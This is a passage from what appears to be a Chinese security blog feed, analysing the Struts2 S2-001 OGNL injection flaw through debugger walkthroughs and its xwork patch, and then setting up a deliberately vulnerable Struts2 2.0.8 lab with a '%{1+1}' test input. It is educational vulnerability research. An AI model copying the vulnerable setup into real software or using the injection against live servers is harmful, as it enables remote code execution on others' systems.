            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>welcome.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>action</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>package</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>struts</span><span class="token punctuation">></span></span></code></pre>
<p>程序将开始处理 <code>index.jsp</code> 。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079976797436.jpg" alt="-w850"></p>
<p>我们的<strong>payload</strong>是从<code>index.jsp</code>输入的，这里需要了解的是<strong>jsp</strong>的本质也是一个<strong>Servlet</strong>，在执行jsp的时候<strong>tomcat</strong>会将其转化为java代码，比如这里<code>index.jsp</code>被转化为<code>index_jsp.java</code>。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080003848710.jpg" alt="-w851"></p>
<p>当在 JSP 文件中遇到 Struts2 标签 <code>&lt;s:textfield</code> 时，程序会先调用 <code>doStartTag</code> ，并将标签中的属性设置到 <code>TextFieldTag</code> 对象相应属性中。最后，在遇到 <code>/&gt;</code> 结束标签的时候调用 <code>doEndTag</code> 方法。</p>
<p>路径： <code>struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080001208107.jpg" alt="-w1212"></p>
<p>路径： <code>struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ui/AbstractUITag.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080002192291.jpg" alt="-w957"></p>
<p>在 <code>doEndTag</code> 方法中调用了 <code>this.component.end</code> 方法，而该方法调用了 <code>evaluateParams</code> 方法来填充 JSP 中的动态数据。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080015352601.jpg" alt="-w1038"></p>
<p>step into <code>end</code> 方法,路径：<code>struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080005812847.jpg" alt="-w977"></p>
<p>跟进 <code>evaluateParams</code> 方法，会发现如果开启了 <code>Ognl表达式</code> 支持<code>( this.altSyntax() )</code>，程序会在属性字段两边添加 Ognl 表达式字符( <code>%{、}</code> )，然后使用 <code>findValue</code> 方法从值栈中获得该表达式所对应的值。<br>路径： <code>struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080027153004.jpg" alt=""></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080029926494.jpg" alt=""></p>
<p>我们来看下 findValue 方法中，具体是如何解析 Ognl 表达式。如下图，可以看到 findValue 方法先调用了 translateVariables 方法，该方法又调用了同名重载方法。问题关键，就在这个同名重载方法中。</p>
<p>路径： <code>struts2-core-2.0.8.jar!/org/apache/struts2/components/Component.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080035233153.jpg" alt=""></p>
<p>路径： <code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080035685916.jpg" alt=""></p>
<p><code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class:31</code></p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">translateVariables</span><span class="token punctuation">(</span><span class="token keyword">char</span> open<span class="token punctuation">,</span> String expression<span class="token punctuation">,</span> ValueStack stack<span class="token punctuation">,</span> Class <span class="token class-name">asType</span><span class="token punctuation">,</span> TextParseUtil<span class="token punctuation">.</span>ParsedValueEvaluator evaluator<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        Object result <span class="token operator">=</span> expression<span class="token punctuation">;</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> start <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>open <span class="token operator">+</span> <span class="token string">"{"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> length <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> x <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

            <span class="token keyword">while</span><span class="token punctuation">(</span>start <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> x <span class="token operator">&lt;</span> length <span class="token operator">&amp;&amp;</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">char</span> c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'{'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token operator">++</span>count<span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'}'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token operator">--</span>count<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">int</span> end <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> end <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> XWorkConverter<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">convertValue</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            String var <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>
            Object o <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">findValue</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>evaluator <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                o <span class="token operator">=</span> evaluator<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            String left <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>
            String right <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>end <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>TextUtils<span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    result <span class="token operator">=</span> left <span class="token operator">+</span> o<span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    result <span class="token operator">=</span> o<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>TextUtils<span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    result <span class="token operator">=</span> result <span class="token operator">+</span> right<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                expression <span class="token operator">=</span> left <span class="token operator">+</span> o <span class="token operator">+</span> right<span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                result <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
                expression <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre>
<p>关键就在这个 <code>translateVariables</code> 函数，在调试过程中可以看到传入的username（expression）多次进入该函数，接下来就分析一下每次发生的变化。</p>
<p>第一次，通过 <code>findValue</code> 取出 username的值，赋给了 <code>o</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080078172140.jpg" alt=""></p>
<p>然后经过一些处理，拼接赋值给了 <code>expression</code> ，进入下一轮循环<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080080286517.jpg" alt=""></p>
<p>可以看到，第二次的 <code>o</code> 取得的值已经变成了 <code>2</code>，说明OGNL表达式已经执行了。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080082535664.jpg" alt=""></p>
<p>最后经过后续的处理，回显在了输入框。</p>
<p>最后经典弹个计算器2333</p>
<p>emmm mac弹计算器没成功，还在找原因。</p>
<h2 id="5-补丁分析"><a href="#5-补丁分析" class="headerlink" title="5-补丁分析"></a>5-补丁分析</h2><p>在 <code>xwork 2.0.4</code> 中添加了一个maxLoopCount属性，限制了递归解析的最大数目。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080222290205.jpg" alt="-w1382"></p>
<p>从而在解析到 <code>%{1+1}</code> 时，不会继续向下递归了，这样就修复了该漏洞。</p>
<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6-参考"></a>6-参考</h2><p><a href="https://mochazz.github.io/2020/06/16/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-001/#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D" target="_blank" rel="noopener">Java代码审计之Struts2-001(一) – mochazz</a></p>
<p><a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#OGNL%E8%AF%AD%E6%B3%95%E6%A0%91" target="_blank" rel="noopener">OGNL表达式注入漏洞总结</a></p>
<p><a href="https://mengsec.com/2019/10/29/Java-Web-S2-001/" target="_blank" rel="noopener">Java web s2-001 – MengSec</a></p>
<p><a href="http://zhengbao.wang/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E4%B9%8Bs2-001%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">java代码审计入门之s2-001复现分析</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2 漏洞分析环境搭建</title>
    <url>/2020/12/15/struts2-lou-dong-fen-xi-huan-jing-da-jian/</url>
    <content><![CDATA[<blockquote>
<p>为了不再混水摸鱼，开始补习安全基础，开始学Java安全(ง •̀_•́)ง，从最经典的Struts2漏洞开始，本篇是环境搭建过程。</p>
</blockquote>
<h2 id="1、测试环境"><a href="#1、测试环境" class="headerlink" title="1、测试环境"></a>1、测试环境</h2><pre><code>macOS Catalina 版本 10.15.6
Java version &quot;1.8.0_261&quot;
IDEA 2020.2
tomcat 9.0.39</code></pre><h2 id="2、创建项目"><a href="#2、创建项目" class="headerlink" title="2、创建项目"></a>2、创建项目</h2><h3 id="2-1-Maven"><a href="#2-1-Maven" class="headerlink" title="2.1 Maven"></a>2.1 Maven</h3><p>通过Maven创建项目，如下图的顺序，注意勾选<code>Create from archetype</code>,选择webapp。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076159094442.jpg" alt="-w1376"></p>
<p>下一步就是选择项目文件夹<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076160983476.jpg" alt="-w1376"></p>
<p>然后<code>groupid</code>和<code>artifactid</code>都可以自定义，之后Finish。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076162561059.jpg" alt="-w1376"></p>
<p>然后会自动下载所需的jar包等文件进行构建，只需要静静等待几分钟就好了。<br>然后此时创建好的项目如图所示。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076166097919.jpg" alt="-w1512"></p>
<p>接下来分别添加并配置Maven的<code>pom.xml</code>，Tomcat的<code>web.xml</code>，Struts2的<code>struts.xml</code>。</p>
<p>在main目录下创建一个java文件夹，里面放置我们自定义的java类文件.<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076169701640.jpg" alt="-w406"></p>
<p>在里面我们创建自定义的Java Package。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076170175844.jpg" alt="-w406"></p>
<p>然后在其中创建一个名为LoginAction的Java类，内容为:</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>lanvnal<span class="token punctuation">.</span>s2001<span class="token punctuation">.</span>action<span class="token punctuation">;</span>

<span class="token keyword">import</span> com<span class="token punctuation">.</span>opensymphony<span class="token punctuation">.</span>xwork2<span class="token punctuation">.</span>ActionSupport<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginAction</span> <span class="token keyword">extends</span> <span class="token class-name">ActionSupport</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> String username <span class="token operator">=</span> null<span class="token punctuation">;</span>
    <span class="token keyword">private</span> String password <span class="token operator">=</span> null<span class="token punctuation">;</span>

    <span class="token keyword">public</span> String <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> String <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span>String username<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPassword</span><span class="token punctuation">(</span>String password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">=</span> password<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> String <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token string">"error"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>刚开始添加了代码之后可能会有报错，这是因为没有引入该包</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076174879559.jpg" alt="-w674"></p>
<p>可以先不用管，去配置一下<code>pom.xml</code>就好了。<br>接下来修改pom.xml，添加如下内容:(添加到<code>&lt;dependencies&gt;</code>这一对标签中)</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.struts<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>struts2-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre>
<p>添加这个配置之后，点击界面上出现了maven更新小按钮Maven会自动将对应版本的Jar包下载导入，不需要手工配置了。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076175738228.jpg" alt="-w368"></p>
<p>再修改<code>web.xml</code>，在这里主要是配置<code>struts2</code>的过滤器。</p>
<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>S2-001 Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>struts2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>org.apache.struts2.dispatcher.FilterDispatcher<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>struts2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span></code></pre>
<p>然后，在 <code>webapp</code> 目录下创建&amp;修改两个文件 —— <code>index.jsp</code>&amp;<code>welcome.jsp</code>，内容如下。</p>
<p><strong>index.jsp</strong></p>
<pre class=" language-jsp"><code class="language-jsp"><%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>S2-001</title>
</head>
<body>
<h2>S2-001 Demo</h2>
<p>link: <a href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<s:form action="login">
    <s:textfield name="username" label="username" />
    <s:textfield name="password" label="password" />
    <s:submit></s:submit>
</s:form>
</body>
</html></code></pre>
<p><strong>welcome.jsp</strong></p>
<pre class=" language-jsp"><code class="language-jsp"><%--
  Created by IntelliJ IDEA.
  User: lanvnal
  Date: 2020/12/11
  Time: 12:32 上午
  To change this template use File | Settings | File Templates.
--%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>S2-001</title>
</head>
<body>
<p>Hello <s:property value="username"></s:property></p>
</body>
</html></code></pre>
<p>然后在 <code>main</code> 文件夹下创建一个 <code>resources</code> 文件夹，内部添加一个 <code>struts.xml</code>，内容为：</p>
<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>

<span class="token doctype">&lt;!DOCTYPE struts PUBLIC
        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
        "http://struts.apache.org/dtds/struts-2.0.dtd"></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>struts</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>S2-001<span class="token punctuation">"</span></span> <span class="token attr-name">extends</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>struts-default<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.mengsec.s2001.action.LoginAction<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>welcome.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>action</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>package</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>struts</span><span class="token punctuation">></span></span></code></pre>
<p>这里遇到了个小问题，就是添加 <code>struts.xml</code> 文件时新建文件模板里没有对应的配置：<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076187822578.jpg" alt="-w1005"></p>
<p>解决方案就是在首选项 =&gt; plugins =&gt; 搜索struts2 然后安装就好了<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076188441890.jpg" alt="-w1109"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076188897216.jpg" alt="-w824"></p>
<p>此时项目目录如下：<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076189686774.jpg" alt="-w401"></p>
<p>接下来配置Tomcat服务器，在Mac上的话，直接 <code>brew install tomcat</code> 即可安装tomcat9，安装的路径为<code>/usr/local/Cellar/tomcat/9.0.39</code>。</p>
<blockquote>
<p>To have launchd start tomcat now and restart at login:<br>brew services start tomcat<br>Or, if you don’t want/need a background service you can just run:<br>catalina run</p>
</blockquote>
<p>如果想要后台启动服务，使用：<code>brew services start tomcat</code><br>不需要的话直接：<code>catalina run</code></p>
<h3 id="2-2-添加服务器"><a href="#2-2-添加服务器" class="headerlink" title="2.2 添加服务器"></a>2.2 添加服务器</h3><p>添加一个本地的Tomcat服务器。具体步骤如下图<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076192942664.jpg" alt="-w1426"></p>
<p>这个路径参考前面安装时提到的安装目录<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076194451436.jpg" alt="-w1507"></p>
<p>端口根据自身环境修改，我改成了8008.<br>然后右下角的提示，可以点击fix或者点击Deployment，添加一个artifacts。</p>
<p>然后点击左上角的绿色三角就可以运行了。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076202862267.jpg" alt=""></p>
<h3 id="2-3-测试环境"><a href="#2-3-测试环境" class="headerlink" title="2.3 测试环境"></a>2.3 测试环境</h3><p>在username 的输入框输入：<code>%{1+1}</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/Struts2_Env/16076203423070.jpg" alt=""></p>
<p>如图，环境搭建成功！</p>
]]></content>
      <categories>
